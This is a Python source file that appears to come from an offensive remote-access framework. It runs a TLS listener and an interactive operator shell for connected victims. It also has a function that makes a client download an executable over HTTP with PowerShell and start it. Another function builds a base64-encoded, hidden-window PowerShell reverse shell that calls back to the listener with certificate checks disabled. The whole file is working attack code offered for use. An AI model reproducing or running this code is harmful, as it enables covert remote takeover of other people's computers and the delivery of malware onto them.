#!/usr/bin/python
import socket
import ssl
import random
import re
import sys
import os
import time
from threading import Thread
from main import *
from menu import *


def startListener():
    time.sleep(0.25)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, certfile="server.crt", keyfile="server.key", server_side=True)
    except:
        print t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal
        sys.exit(1)
    try:
        ws.bind((FUNCTIONS().CheckInternet(), 5555))
        ws.listen(30)
    except:
        print t.bold_red + "[*] Error with listener - Port in use" + t.normal
        sys.exit(1)

    print t.bold_red + "listening on port 5555" + t.normal
    clientnumber = 0

    while True:
        clientconn, address = ws.accept()
        ip , port = address
        if clientconn:
            clientnumber += 1
            print t.bold_green + "connection from %s %s"%(ip,port) + t.normal

            worker = Thread(target=pingClients, args=(clientconn,clientnumber))
            worker.setDaemon(True)
            worker.start()

        from menu import clientMenuOptions
        clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
    ws.close()




def interactShell(clientconn,clientnumber):
    from menu import clientMenuOptions
    print "Commands\n" + "-"*24 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*24
    while True:
        data = ''
        command = raw_input("PS >")
        if command == "back":
            break
        if command == "exit":
            print t.bold_red + "Client Connection Killed" + t.normal
            del clientMenuOptions[str(clientnumber)]
            clientconn.close()
            break
        if command == "":
            continue
        clientconn.sendall(command)
        while True:
            data = clientconn.recv(1).encode("utf-8")
            sys.stdout.write(data)
            sys.stdout.flush()
            if data == "\x00":
                break
    return True


def clientUpload(fileToUpload,clientconn,powershellExec):
    print type(fileToUpload)
    if powershellExec:
        clientconn.sendall(powershellExec)
    else:
        print type(fileToUpload)
        fileToUpload += '.exe'
        print t.bold_green + "[*] Starting Transfer" + t.normal
        ipaddr = FUNCTIONS().CheckInternet()
        FUNCTIONS().DoServe(ipaddr,fileToUpload,os.path.dirname(fileToUpload))
        clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 25;Start-Process \"$Env:TEMP\\temp.exe\"")

def printListener():
    windows_ps_rev_shell = (
        "$client = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{0};"
        "$sslstream = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
        "$sslstream.AuthenticateAsClient('10.131.101.65',$null,[System.Security.Authentication.SslProtocols]::Tls,$false);"
        "while(($i = $sslstream.Read($bytes, 0, $bytes.Length)) -ne 0)"
        "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
        "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String);"
        "$backres = $commandback + ($error[0] | Out-String) + \"\x00\";$error.clear();"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$sslstream.Write($sendbyte,0,$sendbyte.Length);"
        "$sslstream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
    print 'powershell.exe -WindowStyle Hidden -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
    return True

def pingClients(clientconn,clientnumber):
    from menu import clientMenuOptions
    try:
        while True:
            time.sleep(15)
            clientconn.recv(1)
    except:
        print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
        del clientMenuOptions[str(clientnumber)]
        sys.exit(1)
